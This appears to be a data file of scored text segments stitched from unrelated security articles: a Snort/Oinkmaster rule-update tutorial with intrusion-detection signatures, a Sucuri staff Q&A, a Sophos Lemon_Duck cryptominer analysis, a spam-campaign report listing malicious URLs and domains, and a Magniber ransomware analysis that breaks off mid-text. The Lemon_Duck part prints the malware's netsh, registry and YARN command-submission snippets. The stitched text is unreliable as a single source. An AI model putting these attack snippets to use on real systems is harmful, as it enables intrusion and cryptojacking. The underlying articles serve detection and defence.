"100%[====================================>] 68,234        16.53K/s    ETA 00:00",0.011487761643023231
15:05:18 (16.53 KB/s) - `oinkmaster-snapshot.tar.gz' saved [68234/68234],0.012778267685744082
"[root@sensor src]# tar -xzvf oinkmaster-snapshot.tar.gz
oinkmaster/
oinkmaster/contrib/
oinkmaster/contrib/README.contrib
oinkmaster/contrib/addmsg.pl
oinkmaster/contrib/addsid.pl
oinkmaster/contrib/create-sidmap.pl
oinkmaster/contrib/makesidex.pl
oinkmaster/contrib/oinkgui.pl
oinkmaster/ChangeLog
oinkmaster/FAQ
oinkmaster/INSTALL
oinkmaster/LICENSE
oinkmaster/README
oinkmaster/README.gui
oinkmaster/README.templates
oinkmaster/README.win32
oinkmaster/UPGRADING
oinkmaster/oinkmaster.1
oinkmaster/oinkmaster.conf
oinkmaster/oinkmaster.pl
oinkmaster/template-examples.conf",0.01582958547691371
"The default oinkmaster.conf is set up just as I want it to be.  Namely, it knows to not update local.rules and snort.conf, which are customized for my environment.  So, I copy the default oinkmaster.conf file to an alternative location, and then run Oinkmaster to see its default switches:",0.01280421221975725
"[root@sensor src]# cp oinkmaster/oinkmaster.conf /usr/local/etc/snort/oinkmaster.conf
[root@sensor src]# /usr/local/src/oinkmaster/oinkmaster.pl",0.013475534195856564
Error: no output directory specified.,0.011422974950982878
Oinkmaster v1.0 by Andreas Ostling (andreaso@it.su.se),0.013012022422154712
Usage: oinkmaster.pl -o outdir [options],0.009431056468953702
"outdir is where to put the new files.
This should be the directory where you store your Snort rules.",0.011528383256888208
"Options:
-b dir     Backup your old rules into dir before overwriting them
-c         Careful mode - only check for changes and do not update anything
-C cfg     Use this configuration file instead of the default
May be specified multiple times to load multiple files
-e         Enable all rules that are disabled by default
-h         Show this usage information
-i         Interactive mode - you will be asked to approve the changes (if any)
-q         Quiet mode - no output unless changes were found
-Q         super-quiet mode (like -q but even more quiet when printing results)
-r         Check for rules files that exist in the output directory
but not in the downloaded rules archive
-T         Test configuration and then exit
-u url     Download from this URL instead of the one in the configuration file
(must be http://, https://, ftp://, file:// or scp:// ... .tar.gz)
-U file    Merge new variables from downloaded snort.conf into
-v         Verbose mode
-V         Show version and exit",0.019896874658876462
I first run Oinkmaster with -c (careful mode) to see the changes it recommends:,0.009474361344968485
"[root@sensor src]# /usr/local/src/oinkmaster/oinkmaster.pl -c
-o /usr/local/etc/snort/rules -C /usr/local/etc/snort/oinkmaster.conf",0.017001118975841
Loading /usr/local/oinkmaster-1.0/oinkmaster.conf,0.009075475202651395
Downloading file from http://www.snort.org/dl/rules/snortrules-snapshot-2_1.tar.gz... done.,0.015820436052594977
"Archive successfully downloaded, unpacking... done.",0.01582944253007179
"Processing downloaded rules... disabled 0, enabled 0, modified 0, total=2113.",0.008579406036887227
Setting up rules structures...,0.013539870007312271
"WARNING: duplicate SID in your local rules,
SID 2114 exists multiple times, please fix this manually!",0.012619545244564545
"WARNING: duplicate SID in your local rules,
SID 2113 exists multiple times, please fix this manually!",0.012667804749949219
done.,0.008718744643971266
Comparing new files to the old ones... done.,0.016526695221248944
Skipping backup since we are running in careful mode.,0.013615569243603076
Note: Oinkmaster is running in careful mode - not updating anything.,0.011431330752649793
[***] Results from Oinkmaster started Sun Jul 11 14:44:43 2004 [***],0.010236829872221076
[+++]          Added rules:          [+++],0.009228449134796368
-> Added to ftp.rules (1):,0.01398284103977454
"alert tcp $EXTERNAL_NET any -> $HOME_NET 21
(msg:""FTP RETR format string attempt""; flow:to_server,established;
content:""RETR""; nocase; pcre:""/^RETR\s[^\n]*?%[^\n]*?%/smi"";
reference:bugtraq,9800; classtype:attempted-admin; sid:2574; rev:1;)",0.013890299466453926
-> Added to oracle.rules (1):,0.01480692434867037
"alert tcp $EXTERNAL_NET any -> $SQL_SERVERS $ORACLE_PORTS
(msg:""ORACLE generate_replication_support prefix overflow attempt"";
flow:to_server,established; content:""generate_replication_support"";
nocase; pcre:""/(package|procedure)_prefix[\s\r\n]*=>
[\s\r\n]*('[^']{1000,}|""[^""]{1000,})/Rsmi"";
classtype:attempted-user; sid:2576; rev:2;)",0.012660268073740766
"...edited...
[///]     Modified active rules:     [///]",0.015237382244164155
-> Modified active in attack-responses.rules (4):,0.013125282177802622
"old: alert tcp $HOME_NET 749 -> $EXTERNAL_NET any
(msg:""ATTACK-RESPONSES successful kadmind buffer overflow attempt"";
flow:established,from_server; content:""*GOBBLE*""; depth:8;
reference:cve,CAN-2002-1235; reference:url,www.kb.cert.org/vuls/id/875073;
classtype:successful-admin; sid:1900; rev:5;)",0.011989365042158973
"new: alert tcp $HOME_NET 749 -> $EXTERNAL_NET any
(msg:""ATTACK-RESPONSES successful kadmind buffer overflow attempt"";
flow:established,from_server; content:""*GOBBLE*""; depth:8;
reference:bugtraq,5731; reference:bugtraq,6024; reference:cve,2002-1226;
reference:cve,2002-1235; reference:url,www.kb.cert.org/vuls/id/875073;
classtype:successful-admin; sid:1900; rev:10;)",0.012908001836739569
"old: alert tcp $HOME_NET 22 -> $EXTERNAL_NET any
(msg:""ATTACK-RESPONSES successful gobbles ssh exploit uname"";
flow:from_server,established; content:""uname""; reference:bugtraq,5093;
classtype:misc-attack; sid:1811; rev:5;)",0.011936244746961311
"new: alert tcp $HOME_NET 22 -> $EXTERNAL_NET any
(msg:""ATTACK-RESPONSES successful gobbles ssh exploit uname"";
flow:from_server,established; content:""uname""; reference:bugtraq,5093;
reference:cve,2002-0390; reference:cve,2002-0639; classtype:misc-attack;
sid:1811; rev:8;)",0.01196222318354856
...edited...,0.01035621952061816
[///]    Modified inactive rules:    [///],0.010951309932418996
-> Modified inactive in exploit.rules (1):,0.011424114212650327
"old: #alert tcp $EXTERNAL_NET any -> $HOME_NET 22
(msg:""EXPLOIT ssh CRC32 overflow filler""; flow:to_server,established;
content:""|00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|"";
reference:bugtraq,2347; reference:cve,CVE-2001-0144;
classtype:shellcode-detect; sid:1325; rev:4;)",0.013760644187975957
"new: #alert tcp $EXTERNAL_NET any -> $HOME_NET 22
(msg:""EXPLOIT ssh CRC32 overflow filler""; flow:to_server,established;
content:""|00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|"";
reference:bugtraq,2347; reference:cve,2001-0144; reference:cve,2001-0572;
classtype:shellcode-detect; sid:1325; rev:6;)",0.01357982937020874
...edited...,0.01035621952061816
[---]         Removed rules:         [---],0.02438414353379348
-> Removed from ftp.rules (1):,0.015044678359895536
"alert tcp $EXTERNAL_NET any -> $HOME_NET 21
(msg:""FTP format string attempt""; flow:to_server,established;
content:""%p""; nocase; classtype:attempted-admin; sid:1530; rev:4;)",0.014135207215747236
[*] Non-rule line modifications: [*],0.009264988076630565
None.,0.00846582214045255
[+] Added files: [+],0.008615968886478864
"-> classification.config
-> gen-msg.map
-> reference.config
-> sid-msg.map
-> threshold.conf
-> unicode.map",0.019689559459630135
"You'll see I highlighted some of the output.  These show the various categories of modifications made by Oinkmaster.  Once we are confident that Oinkmaster isn't going to make any changes we don't like, we run it in update mode by removing the ""-c"" flag.  We add the ""-b"" flag and specify a directory to hold a backup of the old ruleset:",0.009708994701498663
"[root@sensor src]# /usr/local/src/oinkmaster/oinkmaster.pl -b /tmp/oldrules
-o /usr/local/etc/snort/rules -C /usr/local/etc/snort/oinkmaster.conf",0.018333623297571933
"Loading /usr/local/oinkmaster-1.0/oinkmaster.conf
...truncated...",0.010063029729442508
Oinkmaster makes an archive of the rules in /tmp/oldrules:,0.00893109884434462
"[root@sensor src]# ls /tmp/oldrules/
rules-backup-20040711-144820.tar.gz",0.01395182661090888
"Notice that in the original test run, Oinkmaster found duplicate rule SIDs of 2113 and 2114.  Oinkmaster should discard the old version, but a manual check finds duplicate rules:",0.007546519650103667
[root@sensor src]# grep -i 2113 /usr/loca/etc/snort/rules/*.rules,0.01427931822778572
"rservices.rules:alert tcp $EXTERNAL_NET any -> $HOME_NET 512
(msg:""RSERVICES rexec username overflow attempt""; content:""|00|""; offset:9;
content:""|00|""; distance:0; content:""|00|""; distance:0;
classtype:attempted-admin; sid:2113; rev:2;)",0.011151096512830638
"rservices.rules:alert tcp $EXTERNAL_NET any -> $HOME_NET 512
(msg:""RSERVICES rexec username overflow attempt""; flow:to_server,established;
content:""|00|""; offset:9; content:""|00|""; distance:0; content:""|00|"";
distance:0; classtype:attempted-admin; sid:2113; rev:3;)",0.012406933985270041
[root@sensor src]# grep -i 2114 /usr/local/etc/snort/rules/*.rules,0.01385017382787801
"rservices.rules:alert tcp $EXTERNAL_NET any -> $HOME_NET 512
(msg:""RSERVICES rexec password overflow attempt""; content:""|00|"";
content:""|00|""; distance:33; content:""|00|""; distance:0;
classtype:attempted-admin; sid:2114; rev:2;)",0.011042181132813078
"rservices.rules:alert tcp $EXTERNAL_NET any -> $HOME_NET 512
(msg:""RSERVICES rexec password overflow attempt""; flow:to_server,established;
content:""|00|""; content:""|00|""; distance:33; content:""|00|""; distance:0;
classtype:attempted-admin; sid:2114; rev:3;)",0.012372726177388604
"This isn't a big deal.  A quick deletion with vi removes the old rules, both having revision number 2.",0.015188096811964868
"Remember that after updating the rule set, Snort must be restarted.  I prefer to stop Snort and then run it in the foreground to make sure it accepts all of the rules.  Once it seems to be running ok, I stop and start it in the background as a daemon with the -D switch.
",0.014490568663437009
Website Security Tips for Black Friday & Cyber Monday,0.014571189506812021
"Sucuri’s focus has always been on educating website owners about the latest threats and vulnerabilities — and much of that depends on our industry-leading research team.
As the holiday season approaches, we asked our researchers what recommendations they had for ecommerce website owners to protect their customers, maintain compliance, and mitigate security risks.",0.012988622504570668
"What do you do at Sucuri?
I am the Threat Research Team manager. My team and I actively search the internet for malware, exploits, and vulnerabilities. Whenever we identify a threat, we write tools to detect and block them — and share these findings and new research with the world.
What malware keeps you up at night?
The ones we haven’t found yet! Complex malware and exploits are always fun to work with and find solutions for, but a good night’s sleep can help you stay on the right path.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Website protection is a constant. My best recommendation is to be vigilant about your site’s security all the time — not just during higher-risk seasons like the holidays.
Avoid downloading and installing software from unofficial sources, perform periodic reviews of installed components and authorized users, keep everything up to date, use multi-factor authentication (or whitelist the IPs that can access the admin area) — there are so many recommendations to improve your website’s security…",0.012189591161806734
"What do you do at Sucuri?
I’m a Senior Malware Researcher. I analyze malware, tear it apart to understand it, work on ways to detect and clear it properly — all while client sites are up and running.
What malware keeps you up at night?
Every malware incident should be taken 100% seriously; there is no such thing as a small infection. A malware infection is just a consequence of a vulnerability in your environment. If an attacker is able to upload a simple “funny” defacement file, he’s capable of uploading and abusing anything there — from using it to store nasty content, to secretly turning your website into a botnet C&C.
If I were to pick one, we’ve seen a huge increase in credit card stealers over the last few years and their growth and consistent prevalence is alarming.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Use a website firewall. The majority of the modern attacks are the automated exploitations of known and zero-day vulnerabilities.
A good firewall (such as ours ) will provide strong protection against known vulnerabilities, even when your site is not fully patched. Since the principles of attacks are often similar, a firewall can also often catch zero-day vulnerabilities, mitigating risk from emerging threats — and we’re definitely protecting sites proactively.
Otherwise, follow standard security best practices. And don’t trust anyone…",0.012392885314531865
"What do you do at Sucuri?
I work as a security researcher. Our main job is to make sure users are protected against the latest security threats affecting popular CMS’.
What malware keeps you up at night?
We are always concerned about zero-day vulnerabilities. We test our solutions constantly to keep them relevant and effective. Attackers are always improving their techniques and attack vectors, so you need the same mindset to survive.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Keep all your software up to date. This is the most basic — and yet most overlooked — security practice. Also, don’t think you should only protect your site during the holiday season. Attackers can infect your site in well advance and you wouldn’t even notice.
It’s also important to engage your customer base with good security practices. Even if your website meets all the security requirements and is PCI compliant, keep in mind that the user is always the weakest link. Keeping your users updated with the best security practices is also your responsibility.
Enable security alerts for all of your financial transactions. This way, you can detect anomalies and act accordingly without having to wait for (or rely on) user’s complaints.",0.016651921930500246
"What do you do at Sucuri?
I research emerging threats that have the potential to impact our clients and analyze interesting malware samples for new techniques implemented by malware authors.
What malware keeps you up at night?
Malware that is used for intelligence/information gathering (i.e spying), which can then be used to launch more targeted attacks against the victims.
The recent CVE-2019-2234 vulnerability for Google and Samsung camera apps has demonstrated just how invasive this type of spying malware can be in terms of the sheer data it gathers.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Use payment processors, limit third-party software, remove unused software, and most importantly: have a system for monitoring your website’s environment. This will help you identify indicators of compromise and react faster, hopefully limiting any unauthorized access or fraudulent activity.
What do you do at Sucuri?
I’m a threat researcher, so I research threats!
This means finding vulnerabilities on popular applications, working on tools to improve our methodologies, and ensuring our WAF blocks the latest exploits.
What malware keeps you up at night?
Ransomwares are the worst.
They encrypt files, including old photos and videos, and request money to decrypt them.
This is one of many reasons why having backups is important — yet only a fraction of website owners use and maintain these critical assets.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Be ready to scale, you don’t want your website to experience any outages during this period!
Both in amount of visitors — which you need to be ready to serve — and in preventive measures against attacks like DDoS.",0.010691280257105196
"What do you do at Sucuri?
I am part of the Technical Security team: I write signatures for new malware so our tools can detect them and clean them. I refine and optimize any problematic signatures if there are false positives, and also work on more complex cases that require further attention. Sometimes, I get to write blog posts based on cases I worked on.
What malware keeps you up at night?
Surprisingly, even one small line of malware containing only a few characters long can be capable of wreaking havoc or endangering the security of a website.
It’s incredibly easy for attackers to leave a line of code in a random file as a backdoor, then come back to reinfect a website at a later time. Our team combats and resolves these scenarios every day — and we’re always working to improve our tools better detect this kind of malware.
Credit card stealing software also keeps me up at night; every time I buy something online with my credit card, I wonder if it will get stolen.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Getting blacklisted around the holidays can be devastating for any ecommerce website, since it seriously impacts brand reputation and revenue.
My recommendation to site owners is to review and ensure you are using the latest version of your software to patch known vulnerabilities. Now would also be a good time to change all of your passwords and start the new year fresh, as part of a website maintenance plan.
As users begin ramping up purchases for the holiday season, there are likely going to be holiday scams and spam going around. Always be vigilant and review activities and website behavior to make sure it’s not hosting any malware or spam.",0.016728756444317372
"What do you do at Sucuri?
I am a Tier 2 Security Analyst. My job is to clean up infected websites, find and investigate new malware infections and report them to our Research team, and identify new trends in the malware landscape.
What malware keeps you up at night?
Most of the malware that I see is pretty pedestrian — pharmacy spam, essay/jersey spam, and all other kinds of spam. Other more severe types of infections like credit card swipers cause me much more concern, and honestly make me hesitate to use anything other than a prepaid credit card for online shopping. I’ve also seen malware that drops all database tables for no reason other than spite. But really, the only type that keeps me up at night is ransomware  — once that hits your computer or website there’s no recourse.
What recommendations do you have for ecommerce website owners to protect their sites during the holidays?
Most credit card swiper malware that I see is very simple — all they need to do is brute force your administrator panel and insert a single line of JavaScript from a malicious domain. To mitigate risk, protect your admin panel with 2FA and use a custom login URL.
Other common threats that I see are when attackers modify the actual PHP or JS files on the server, and the best way to protect against this is to restrict FTP/SFTP/SSH login to only whitelisted IP addresses. Use SSH key authentication rather than password authentication. Also, pet every cat you see (this grants you good karma).
",0.01224873967659168
Lemon_Duck cryptominer targets cloud apps & Linux,0.007713316022463057
An aggressive cryptojacker tests new exploits as it rapidly adopts upgraded features,0.008414143581908284
"Written by
Rajesh Nataraj",0.011788579247072994
"August 25, 2020",0.009293401117807631
SophosLabs Uncut 65529/TCP 8088/tcp CVE-2017-8570 EternalBlue Exploits Hadoop Lemon_Duck maldoc mimikatz SMBGhost YARN,0.008570710038540152
"Enterprises have always been a preferred target for the gangs that spread malicious cryptominers. Not only do they often operate hefty computing resources (which helps the cryptojackers mine cryptocurrency more quickly), but the networks enterprises operate are attractive to subsequent attacks: Criminals may use the initial infected machine as a foothold from which they’ll attempt to move laterally within the network and infect more machines, constantly fine-tuning the attacks with new vulnerabilities and social engineering techniques
The Lemon Duck cryptominer is one of the more advanced types of cryptojacker payloads we’ve seen. Its creators continuously update the code with new threat vectors and obfuscation techniques to evade detection, and the miner itself is “fileless,” meaning it remains memory resident and leaves no trace of itself on the victim’s filesystem.
In this post, I’ve shared information on the new attack vectors employed by this campaign, and some follow-ups to the rest vectors I discussed in my previous post on this subject.",0.013109562786903117
"Covid-19-themed email & attachments
Some attackers who rely on social engineering via spam usually take advantage of major events, such as the end-of-year holiday season, tax-filing deadlines for various countries, and current events to customize their attacks. Accordingly, the threat actors behind Lemon_Duck, like many other threat actors, have leveraged global anxiety about the COVID-19 pandemic in a series of coronavirus-themed emails in a mass spam campaign where the recipients receive malicious attachments.
Computers infected with this miner may also become unwitting superspreaders of this cryptojacker, as the malware retrieves the Outlook contacts from the compromised machine and tries to send spam emails with the malicious attachment to your friends and coworkers. It’s hard to overstate the risk of harm here, since people are more likely to trust messages from people they know than from random internet accounts.
Lemon_Duck does this all, on the fly, with code that generates the email messages and attachments dynamically, pulling from a list of subject lines, message body text, and other content that include phrases like “The Truth of COVID-19,” “COVID-19 nCov Special info WHO,” or “HALTH ADVISORY: CORONA VIRUS” (sic).",0.015466580752375614
"“$mail_pools@((“EmailSubject”, “Inline Message”))” is a multi-dimensional array where the subject and inline message are randomly chosen while composing the email message. The malicious attachment used in this attack is an office document that contains exploits and malicious Jscript.
The RTF exploit they’re using is CVE-2017-8570 (aka, the “Composite Moniker” vulnerability); the attacker constructs a document containing this exploit using a builder module, and adds it as an attachment to the spam email, using code shown below.
The builder tool embeds the exploit into the office document payload
JS Scriptlet Builder [readme.js]The final result is a message that looks like this.",0.012068136069928959
"Lemon_Duck, SMBGhost (CVE-2020-0796), and other vulnerabilities
Lemon_Duck exploits the SMBGhost flaw by sending a specially-crafted packet to a targeted SMBv3 server. This vulnerability exists on Windows 10 version 1903 and 1909, but Microsoft issued a patch in March 2020 that eliminates its effectiveness on patched machines. Achieving remote code execution has been hard in the real world.
This miner treats its SMBGhost module as though it were in an evaluation phase: The attacker logs information about the vulnerable machine, as well as any information about the successfully exploited machine.
The attack code used by the Lemon_Duck threat actors also contains exploit code for EternalBlue and an implementation of Mimikatz. For a period of time this summer, between early June and August, the attackers changed this, commenting out the module code for those two attack vectors, preventing them from running.
It’s impossible to know their motivations, but one hypothesis is that they did this to evaluate the effectiveness of the SMBGhost remote code execution exploit. Maybe the results didn’t turn out too well for them, because since the first week of August, they’ve reverted the changes by re-enabling the Mimikatz and EternalBlue code.
Mimikatz And SMB exploitation disabled in mid-June, then re-enabled in August",0.010939954576342115
"After exploitation, when they’ve executed the malicious code on the compromised machine, the Lemon_Duck attackers attempt to disable SMBv3 compression through the registry and block the standard SMB network ports of 445 & 135. They do this in order to prevent other threat actors from taking advantage of the same vulnerability they exploited. Machines with [65529/TCP] active port indicate that the machine is been compromised with any one of the attack vectors.
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
netsh advfirewall firewall add rule name=""deny445"" dir=in protocol=tcp localport=445 action=block
netsh advfirewall firewall add rule name=""deny135"" dir=in protocol=tcp localport=135 action=block
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" DisableCompression -Type DWORD -Value 1 ???Force
Binary brute force using EternalBlue
The miner campaign also downloads a malicious executable to the temp directory. This python-compiled binary loads the Mimikatz component through reflective injection to harvest the NTLM hash & credentials. The executable also tries to generate a random list of IP addresses to scan for vulnerability to (and attempt to leverage) the EternalBlue exploit.
Lemon_Duck’s randomly-generated list of target IP address ranges in CIDR notation
SSH brute force attack
This aspect of the campaign expands the mining operation to support computers running Linux. The brute-force module performs port scanning to find machines listening on port 22/tcp (SSH Remote Login). When it finds them, it launches an SSH brute force attack on these machines, with the username root and a hardcoded list of passwords. If the attack is successful, the attackers download and execute malicious shellcode.",0.013990866297041937
"The downloaded shell script tries to create persistence in the machine through a cron job.
In order to spread across the network, it tries to look for the targets in /.ssh/known_hosts. With the gathered user account and authentication information, it could download the malicious shell script into the new target and execute it through SSH, which (because of its end-to-end encryption) would not be detectable by typical network attack detection tools.
To use system resources efficiently (and to make sure that Lemon_Duck is the only beneficiary of the machine), the malicious script cleverly tries to identify and remove any other miners (maliciously installed or not) from the machine by enumerating the filesystem, the list of active processes, and active network ports.",0.012270097248438638
"Redis Compromise
Redis (REmote DIctionary Server) is an in-memory, distributed database, which can serve millions of requests per second. Redis is designed to be used within a trusted network and to be accessed by trusted clients. If the Redis instance is not properly configured and left exposed to external networks, then the attacker can easily find them through a port scan (6379/tcp) on a generated list of IPs.
On default the instance will not have any authentication, so an attacker could write a malicious code to the DB and create persistence in the instance through cron job so that malicious code can be executed periodically.
Unauthenticated Hadoop cluster
YARN (Yet Another Resource Negotiator) is one of the core components introduced in Hadoop 2.0 to improve resource allocation and task scheduling for various applications running in a Hadoop cluster. A default installation will have security settings that are disabled and would allow an unauthenticated user to execute arbitrary commands in the cluster.
The Lemon_Duck attacker identifies Hadoop servers through a port scan on 8088/tcp to identify the clusters managed by YARN. The attacker then tries to create a new application instance in the cluster by means of a POST request to /ws/v1/cluster/apps/new-application.
If the server doesn’t have any authentication requirements, it may process the request and return the application ID.  Using the application ID, the attacker could submit a malicious command to execute in the Hadoop instance.
$postdata=""{""""application-id"""":""""$keyid"""",
""""application-name"""":""""$keyname"""",
""""application-type"""":""""YARN"""",
""""am-container-spec"""":{""""commands"""":{""""command"""":""""$cmd""""}}}""",0.013702706465512082
"urlpost $ip ""/ws/v1/cluster/apps"" $postdata",0.007976956210411279
"Attack Vector Stats
We’ve compiled a series of statistics that describe the frequency with which Lemon_Duck uses these attack vectors in attacks we’ve observed targeting networks we monitor for malicious activity.",0.015608171972579465
"Detection Coverage
These multiple threat attack vectors are blocked by Sophos endpoint security products as AMSI/PSobfus-B, Exec_21a, C2_10a, Exp/20178570-B, Mal/DrodZp-A, Mal/MineJob-C, Troj/LDMiner-A, HPmal/mPShl-B and Linux/Miner-RK.
Updated indicators of compromise can be found on the SophosLabs Github.
Acknowledgements
I would like to thank Andrew Brandt and Gábor Szappanos for their contribution to this post.",0.010685306344316636
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"2
",0.012344956490214498
"Verizon Wireless customers, beware!
For over a week now, cybercriminals have been persistently spamvertising millions of emails impersonating the company, in an attempt to trick current and prospective customers into clicking on the client-side exploits and malware serving links found in the malicious email.
Upon clicking on any of the links, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.011727802137189713
Screenshot of the spamvertised email:,0.01024206182675269
"Spamvertised malicious URLs: hxxp://coaseguros.com/components/com_ag_google_analytics2/notifiedvzn.html; hxxp://clinflows.com/components/com_ag_google_analytics2/vznnotifycheck.html
Client-side exploits serving URL: hxxp://strangernaturallanguage.net/detects/notification-status_login.php?mzuilm=073707340a&awi=45&dawn=04083703023407370609&iwnjdt=0a000300040002
Sample client-side exploits served: CVE-2010-0188
Upon successful client-side exploitation, the campaign drops MD5: b8d6532dd17c3c6f91de5cc13266f374 – detected by 26 out of 44 antivirus scanners as Trojan-Spy.Win32.Zbot.fkth
Once executed, the sample phones back to tuningmurcelagoglamour.ru, tuningfordmustangxtremee.ru  – 146.185.220.28, AS58014",0.008981690345307491
"Name servers used in the campaign: ns1.2ns.info
The same name server is also offering DNS services to the following malicious domains, part of the campaign’s infrastructure:
100zakazov.ru
1waybet.com
2domains.net
a-dessin.com
aconstance.com
adata.ru
apinosoft.com
arenda24.net
aventadortuningrsport.ru
avstraliya.org
babyliss.net.ru
battlefieldmoon.com
beaddreamin.com
bublik.com
cantcuffus.com
cdaparty.com
centrizone.com
chelny-holod.ru
cmsstore.net
co-ltd.net
creatoric.com
di1.ru
djbm.ru
es-sahafa.com
ext.lv
fe-nix.ru
flashka.info
fleshka.ru
fordmustangtuninglabs.ru
fuck-access.com
garudakr.com
gaypirates.ru
gazinstroy.ru
genumesarider.ru
gis.ru
gloriousbabeporn.com
goslotto.ru
hedonism.ru
it-event.ru
itnote.info
jasminlive.ru
karpenkov.ru
lavka-chudes.ru
legendarno.biz
leonid.info
lithoart.net
lodka.tv
lyubov.net
macd.ru
migalki.info
milkyart.pp.ua
morbo.ru
myfilmix.ru
navtat.ru
ngksint.com
nnm.cc
nunta-ta.com
o001oo.ru
orgfin.ru
positime.ru
prisnilos.su
promstok.ru
qsba.com.ua
qtel.ru
rainbowlizard.net
rock.od.ua
rospromportal.ru
rpfm.ru
ru116.ru
rukazan.ru
salespb.ru
sellbrand.net
sextyumen.ru
shamaili.ru
shtin.com
sizov.biz
skripov.com
skyis.me
skynetcompany.ru
smscent.com
spypdf.com
stockmap.ru
synapticwave.com
tanque.biz
tropeonline.com
villaside.com
vipstudent.org
vivatvictoria.ru
warezzz.info
wn-travel.com
xmages.net
The last time we intercepted a Verizon Wireless themed malicious campaign was in March 2012. We expect to see more campaigns impersonating this company, thanks to the cybercriminal’s proven tactic of rotating the impersonated brands.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.020537900917749652
"Magniber ransomware improves, expands within Asia
This blog post was authored by @hasherezade and Jérôme Segura.
The Magnitude exploit kit is one of the longest-serving browser exploitation toolkits among those still in use. After its inception in 2013, it enjoyed worldwide distribution with a liking for ransomware. Eventually, it became a private operation that had a narrow geographic focus.
During 2017, Magnitude delivered Cerber ransomware via a filtering gate known as Magnigate, only to a select few Asian countries. In October 2017, the exploit kit operator began to distribute its own breed of ransomware, Magniber. That change came with an interesting twist—the malware authors went to great lengths to limit infections to South Korea. In addition to traffic filtering via country-specific malvertising chains, Magniber would only install if a specific country code was returned, otherwise it would delete itself.
In April 2018, Magnitude unexpectedly started pushing the ever-growing GandCrab ransomware, shortly after having adopted a fresh Flash zero-day (CVE-2018-4878). What may have been a test campaign did not last long, and shortly after, Magniber was back again. In our recent captures of Magnitude, we now see the latest Internet Explorer exploit (CVE-2018-8174) being used primarily, which it integrated after a week-long traffic interruption.
In this post, we take a look at some notable changes with Magniber. Its source code is now more refined, leveraging various obfuscation techniques and no longer dependent on a Command and Control server or hardcoded key for its encryption routine. In addition, while Magniber previously only targeted South Korea, it has now expanded its reach to other Asia Pacific countries.
Extracting the payload",0.012702794040954646
72fce87a976667a8c09ed844564adc75 – loader DLL,0.007866280095977007
19599cad1bbca18ac6473e64710443b7 – Magniber’s core DLL,0.006390283837945265
"There are several stages before the final payload is downloaded and executed. After Magnigate’s 302 redirection (Step 1), we see a Base64 obfuscated JavaScript (Step 2) used to launch Magnitude’s landing page, along with a Base64 encoded VBScript. (Both original versions of the scripts are available at the end of this post in the IOCs.) After CVE-2018-8174’s exploitation, the XOR-encrypted Magniber is retrieved.",0.009241293515689919
"Figure 1. Traffic view of a Magniber infection, via Magnigate redirection and Magnitude EK",0.007693406725181928
Figure 2. Decoded Javascript shows redirection to Magnitude’s landing page,0.009232071994851432
"Figure 3. VBScript code snippet showing part of CVE-2018-8174
Once exploitation of the Use After Free vulnerability in Internet Explorer (CVE-2018-8174) is successful, the VBScript will execute the following shellcode:",0.009358053400325028
"Figure 4. Byte array (shellcode)
Functionality-wise, this shellcode is a simple downloader. It downloads the obfuscated payload, decodes it by XOR with a key, and then deploys it:",0.011746902114559865
"Figure 5. Downloading the final payload via InternetOpenUrlw API
The downloaded payload (72fce87a976667a8c09ed844564adc75) is, however, still not the Magniber core, but a next stage loader. This loader unpacks the Magniber’s core DLL (19599cad1bbca18ac6473e64710443b7) and injects it into a process.
Both elements, the loader and Magniber core, are DLLs with Reflective Loader stub, that load themselves into a current process using the Reflective DLL injection technique.
Behavioral analysis
The actions performed by Magniber haven’t changed much; it encrypts files and at the end drops a ransom note named README.txt.",0.012917338084551755
"Figure 6. Ransom note left on the infected machine
The given links lead to an onion page that is unique per victim and similar to many other ransomware pages:",0.011492479046787518
"Figure 7. Magniber’s payment page
The files encrypted by this version of Magniber can be identified by their extension: .dyaaghemy. While in the past each file was encrypted with the same AES key, this time each file is encrypted with a unique key—the same plaintext gives a different ciphertext. The encrypted content has no patterns visible. That suggests that a stream cipher or a cipher with chained blocks was used (probably AES in CBC mode). Below you can see a BMP file before and after being encrypted by Magniber:",0.011959493452182723
"Figure 8. Visualizing a file before and after encryption
Code changes
Magniber is constantly evolving with big portions of its code fully rewritten over time. Below you can see a code comparison between the current Magniber DLL and an earlier version (8a0244eedee8a26139bea287a7e419d9), created with the help of BinDiff:",0.012352093518536056
"Figure 9. Comparing an older Magniber with the newer one
Obfuscation
The authors put a lot of effort in improving obfuscation. The first version we described was not obfuscated at all. The current, in contrast, is obfuscated using a few different techniques. First of all, API functions are now dynamically retrieved by their checksums. For example:",0.015329465596649716
"Figure 10. Calling API functions via checksum
Comparing the new and the old version, we can see some overlapping fragments of code:",0.008156020958544508
"Figure 11. Old version with normal import calls vs. new version with dynamically retrieved functions
The function pointer is retrieved by searching through export tables of the DLLs that are currently loaded. This technique requires that the DLL from which we want to retrieve the function to be already loaded. This algorithm of retrieving function was added to Magniber a few months ago, for example in the sample 60af42293d2dbd0cc8bf1a008e06f394.
In addition, some of the parameters for the calls are dynamically calculated and junk code is added in between the operations. A string that is supposed to be loaded is scattered through several variables.",0.0100575124029324
"Figure 12. Adding junk code to make analysis more tricky
File encryption
We can also observe some changes at the functionality level. The early versions relied on the AES key downloaded from the CnC server (and in case if it was not available, falling back to the hardcoded one, making decryption trivial in such case). This time, Magniber comes with a public RSA key of the attackers that makes it fully independent from the Internet connection during the encryption process. This key is used for protecting the unique AES keys used to encrypt files.
The attacker’s RSA key is hardcoded in the sample in obfuscated form. This is how it looks after deobfuscation:",0.01377946996272772
"Figure 13. Deobfuscated RSA key
